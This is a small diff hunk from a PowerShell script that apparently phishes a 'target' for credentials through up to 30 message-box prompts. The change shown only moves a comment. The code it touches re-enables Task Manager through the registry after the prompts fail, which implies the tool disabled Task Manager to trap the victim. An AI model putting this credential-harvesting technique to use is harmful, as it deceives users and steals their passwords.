@@ -70,8 +70,7 @@ function Credentials(){
         ## Defining the Limmit number of times to ask target for creds before aborting.
         # Change the next value to increase/decrease the number of times the msgbox prompts.
         If($counter -eq 30){
-          If($shellCredsAdmin){
-            ## This Line Un-Blocks Remote-Host 'Task Manager' after reached 30 credentials fail attempts. (Admin privileges Required)
+          If($shellCredsAdmin){## This Line Un-Blocks Remote-Host 'Task Manager' after reached 30 credentials fail attempts. (Admin privileges Required)
             Set-Itemproperty -path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\policies\system' -Name 'DisableTaskMgr' -value 0 -Force
           }
           Start-Process -FilePath $env:windir\explorer.exe
